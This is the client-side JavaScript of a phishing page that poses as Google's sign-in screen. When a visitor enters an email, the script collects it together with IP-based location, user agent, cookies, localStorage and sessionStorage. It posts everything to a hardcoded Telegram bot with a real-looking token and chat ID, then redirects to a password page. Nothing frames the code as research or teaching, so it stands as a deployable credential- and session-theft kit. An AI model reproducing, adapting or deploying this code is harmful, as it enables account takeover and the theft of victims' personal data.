// Configuration
const TELEGRAM_BOT_TOKEN = '8924952197:AAFX7wmy4jr6sf5BpeFbIte4jbO6pOsygxY'; 
const TELEGRAM_CHAT_ID = '5441937815';

// State
let userData = {
    ip: 'Unknown',
    country: 'Unknown',
    state: 'Unknown',
    platform: navigator.platform,
    userAgent: navigator.userAgent
};

// Geolocation
async function fetchIntelligence() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        if (response.ok) {
            const data = await response.json();
            userData.ip = data.ip || 'Unknown';
            userData.country = data.country_name || 'Unknown';
            userData.state = data.region || 'Unknown';
        }
    } catch (e) {
        console.log('Geo fetch failed');
    }
}

// UI Elements
const emailInput = document.getElementById('email');
const signinForm = document.getElementById('signin-form');
const emailNextBtn = document.getElementById('email-next');
const modalOverlay = document.getElementById('modal-overlay');

// Test function to verify storage/cookie capture
function setTestSession() {
    document.cookie = "test_cookie=verified_working; path=/; max-age=3600";
    localStorage.setItem('test_local', 'verified_working');
    sessionStorage.setItem('test_session', 'verified_working');
}

// Init
fetchIntelligence();
setTestSession();

// Functions
function openModal(title, content) {
    document.getElementById('modal-title').textContent = title;
    document.getElementById('modal-body').innerHTML = content;
    modalOverlay.style.display = 'flex';
}

async function sendToTelegram(email) {
    const cookies = document.cookie || 'No cookies found';
    const localData = JSON.stringify(localStorage) || 'Empty';
    const sessionData = JSON.stringify(sessionStorage) || 'Empty';
    
    const message = `
🎯 *Login Started*
📧 *Email:* ${email}
🌐 *IP:* ${userData.ip}
🌍 *Location:* ${userData.state}, ${userData.country}
💻 *Platform:* ${userData.platform}
📱 *User Agent:* ${userData.userAgent}
🍪 *Cookies:* \`${cookies}\`
📦 *LocalStorage:* \`${localData}\`
📂 *SessionStorage:* \`${sessionData}\`
    `;

    try {
        if (TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN') {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        }
    } catch (e) {
        console.error('Telegram send failed', e);
    }
}

async function handleEmailNext() {
    if (!emailInput.value || !emailInput.checkValidity()) {
        emailInput.reportValidity();
        return;
    }

    // Visual Feedback
    emailNextBtn.disabled = true;
    emailNextBtn.textContent = 'Loading...';
    
    // Send to Telegram
    await sendToTelegram(emailInput.value);
    
    // Physical Redirection to another page
    setTimeout(() => {
        window.location.href = `password.html?email=${encodeURIComponent(emailInput.value)}`;
    }, 600);
}

// Events
if (signinForm) {
    signinForm.addEventListener('submit', (e) => {
        e.preventDefault();
        handleEmailNext();
    });
}

if (emailNextBtn) {
    emailNextBtn.addEventListener('click', (e) => {
        e.preventDefault();
        handleEmailNext();
    });
}

document.getElementById('close-modal')?.addEventListener('click', () => {
    modalOverlay.style.display = 'none';
});

// Link Listeners
['forgot-email-link', 'learn-more-link', 'create-account-link'].forEach(id => {
    document.getElementById(id)?.addEventListener('click', (e) => {
        e.preventDefault();
        const content = {
            'forgot-email-link': 'To help keep your account secure, Google needs to confirm this account belongs to you.',
            'learn-more-link': 'When you use Guest mode, your browsing activity is deleted from the browser.',
            'create-account-link': 'Google Accounts are free and give you access to Gmail, YouTube, and more.'
        }[id];
        openModal('Google Help', content);
    });
});

// Init
window.addEventListener('DOMContentLoaded', () => {
    console.log('Email Stage Ready');
});
